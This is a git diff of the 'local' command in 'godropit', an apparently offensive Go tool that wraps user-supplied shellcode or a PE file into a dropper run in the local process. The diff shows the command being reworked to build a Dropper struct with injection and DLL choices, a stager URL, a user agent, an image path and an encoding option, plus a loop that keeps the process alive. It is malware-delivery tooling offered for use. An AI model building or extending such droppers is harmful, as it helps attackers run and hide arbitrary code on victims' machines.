@@ -6,7 +6,8 @@ package cmd
 import (
 	"log"
 
-	"godropit/internal/gengo"
+	"godropit/internal/godroplib/local"
+	"godropit/pkg/gengo"
 
 	"github.com/spf13/cobra"
 )
@@ -19,10 +20,29 @@ var localCmd = &cobra.Command{
 	Short: "Execute in the local process",
 	Long:  `Executes in the local process, if running as an exe I'd recommend using -loop to hold the process open indefinitely.`,
 	Run: func(cmd *cobra.Command, args []string) {
+		checkImg()
 		if input == "" {
 			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
 		}
-		gengo.NewLocalDropper(input, output, domain, name, time, false, shared, arch, loop)
+
+		name = check(name)
+
+		var localDrop gengo.Dropper
+		localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal(gengo.Leet)
+		localDrop.Delay = time
+		localDrop.Arch = arch
+		localDrop.Shared = shared
+		localDrop.Debug = debug
+
+		if loop {
+			localDrop.Hold = local.Hold
+		} else {
+			localDrop.Hold = "//notreq"
+		}
+
+		localDrop.Dtype = "//notreq"
+
+		gengo.NewDropper(localDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
 	},
 }
 
@@ -33,13 +53,6 @@ func init() {
 	localCmd.MarkFlagRequired("name")
 	localCmd.MarkFlagRequired("out")
 
-	// Here you will define your flags and configuration settings.
-
-	// Cobra supports Persistent Flags which will work for this command
-	// and all subcommands, e.g.:
-	// localCmd.PersistentFlags().String("foo", "", "A help for foo")
-
-	// Cobra supports local flags which will only run when this command
-	// is called directly, e.g.:
+	// local specific flags
 	localCmd.Flags().BoolVarP(&loop, "loop", "l", false, "Add a for loop to keep the process alive. Warning: Will potentially keep process alive even if shellcode fails.")
 }
